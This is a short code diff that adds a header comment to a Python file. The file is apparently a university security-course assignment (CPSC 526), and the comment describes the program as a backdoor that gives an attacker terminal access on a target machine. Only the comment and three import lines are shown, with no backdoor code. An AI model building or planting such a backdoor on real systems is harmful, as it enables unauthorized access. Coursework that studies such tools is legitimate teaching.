@@ -1,3 +1,11 @@
+###
+# CPSC 526 - Assignment 1
+# Group: Justin Berry, Andrew Lata
+# This is a Python program that is meant to run as a process on a target machine
+# It grants an attacking user a backdoor, providing an attacker with access to 
+# some terminal commands
+###
+
 import socket
 import getopt
 import sys
